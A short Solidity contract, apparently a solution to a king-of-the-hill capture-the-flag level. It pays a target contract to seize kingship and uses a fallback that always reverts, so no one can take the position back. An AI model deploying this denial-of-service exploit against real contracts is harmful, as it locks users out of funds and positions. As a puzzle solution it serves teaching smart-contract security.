pragma solidity ^0.8.0;

contract KingSlayer {

    constructor(address _king) public payable {
           address(_king).call{value: msg.value}("");
    }

    fallback() external payable {
        revert('Not today, I am the king of this hill!');
    }
}
